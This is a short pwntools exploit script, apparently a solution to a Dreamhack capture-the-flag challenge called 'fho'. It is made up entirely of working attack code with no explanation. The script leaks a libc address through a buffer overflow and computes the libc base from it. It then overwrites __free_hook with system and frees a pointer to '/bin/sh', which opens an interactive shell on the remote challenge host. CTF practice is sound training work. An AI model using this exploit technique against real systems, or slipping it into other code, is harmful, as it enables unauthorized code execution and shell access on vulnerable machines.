from pwn import *

p = remote("host8.dreamhack.games", 15627)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
binsh_offset = next(libc.search(b'/bin/sh'))
libc_start_main_offset = libc.symbols['__libc_start_main']
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc_start_main_offset - 231
binsh = libc_base + binsh_offset
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())

p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()